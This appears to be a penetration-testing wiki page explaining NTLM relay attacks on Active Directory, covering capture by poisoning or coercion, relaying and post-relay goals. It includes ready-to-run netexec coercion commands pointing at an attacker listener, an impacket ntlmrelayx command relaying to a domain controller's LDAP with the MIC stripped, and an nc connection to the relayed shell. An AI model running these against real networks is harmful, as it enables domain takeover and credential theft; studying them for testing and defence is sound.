# NTLM Relay

## <mark style="color:$primary;">ABOUT</mark>

<mark style="color:red;">**NTLM Relaying**</mark> is a <mark style="color:purple;">**multi-stage attack**</mark> where an adversary intercepts a victim's NTLM authentication attempt and forwards it to a different target service to impersonate the victim.

The success of this attack is dictated strictly by protocol configurations and security boundaries. The routing matrix illustrates that you cannot simply relay any authentication to any service. Your path is defined by three variables:

* <mark style="color:yellow;">**Incoming Protocol:**</mark> \
  (SMB vs. HTTP)
* <mark style="color:yellow;">**Mitigations:**</mark> \
  Client-side and Server-side protections (SMB/LDAP Signing, EPA - Extended Protection for Authentication).
* <mark style="color:yellow;">**Outgoing Protocol:**</mark> \
  (SMB, HTTP, LDAP, etc.)

For example, an incoming SMB connection cannot be relayed to another SMB or LDAP service if the target enforces <mark style="color:$warning;">**signing**</mark>. Conversely, coercing an HTTP authentication (like WebDAV) alters the authentication structure, often bypassing those specific SMB signing restrictions and allowing a successful relay to LDAP.

## <mark style="color:$primary;">CAPTURE</mark>

You cannot relay what you do not have. This phase focuses on obtaining the incoming NTLM authentication from a victim machine.

There are two primary methods to feed your relay:

### <mark style="color:yellow;">MITM</mark>

Poisoning network protocols (LLMNR, NBT-NS, mDNS) to intercept organic, broadcasted authentication requests from victims attempting to access non-existent network resources.

### <mark style="color:yellow;">COERCE</mark>

Using specific RPC calls (e.g., PrinterBug, PetitPotam, WebDAV) to actively force a high-value target (like a Domain Controller) to authenticate directly to your controlled attack machine.

#### NXC

With `-M coerce_plus` module of nxc to try 5 methods (PetitPotam, DFSCoerce, PrinterBug, MSEven and ShadowCoerce)

```bash
nxc smb <ip> -u '' -p '' -M coerce_plus -M ntlm_reflection
```

```bash
nxc smb <ip> -u '' -p '' -M coerce_plus -o LISTENER=<AttackerIP>
```

## <mark style="color:$primary;">RELAY</mark>

This is the core network routing phase. Your attack machine acts as a proxy, passing the NTLM challenge and response between the victim and the target service.

The critical constraints here are cryptographic signatures. If the target service requires signing or EPA, the relay will fail because the attacker cannot sign the modified packets without the victim's actual plaintext password or hash. You must select a target service where these mitigations are disabled or can be bypassed by manipulating the incoming protocol (as shown in the routing matrix).

<details>

<summary>NTLM Relay -> LDAP example</summary>

```bash
impacket-ntlmrelayx -t ldap://DC01.militech.local -smb2support --remove-mic --interactive
```

* `--remove-mic`\
  This flag exploits CVE-2019-1040 (or related Drop-the-MIC vulnerabilities). It strips the MIC from the authentication sequence, allowing you to relay an SMB connection to an LDAP service without the Domain Controller rejecting the modified packets.
* `--interactive`\
  Launch an smbclient, LDAP console or SQL shell\
  insteadof executing a command after a successful\
  relay. This console will listen locally on a tcp port

Then we could log in LDAP with `nc`:

```bash
nc 127.0.0.1 11000 
```

</details>

## <mark style="color:$primary;">EXECUTION</mark>

The post-relay payload phase. Once the authentication is successfully relayed and accepted by the target, you execute your objective under the context of the coerced victim.

The execution depends entirely on the service you relayed to and the privileges of the hijacked account:

* LDAP: Modifying AD attributes (e.g., RBCD abuse, Shadow Credentials).
* SMB: Dumping local SAM hashes or gaining remote command execution.
* HTTP/HTTPS: Requesting malicious certificates (AD CS ESC1/ESC8).

_(Note: Future modules covering specific post-exploitation payloads will link back to this phase.)_

## <mark style="color:$primary;">RESOURCES</mark>

{% embed url="https://www.thehacker.recipes/ad/movement/ntlm/relay" %}

{% embed url="https://www.netexec.wiki/smb-protocol/scan-for-vulnerabilities#scan-for-coerce-vulnerabilities" %}
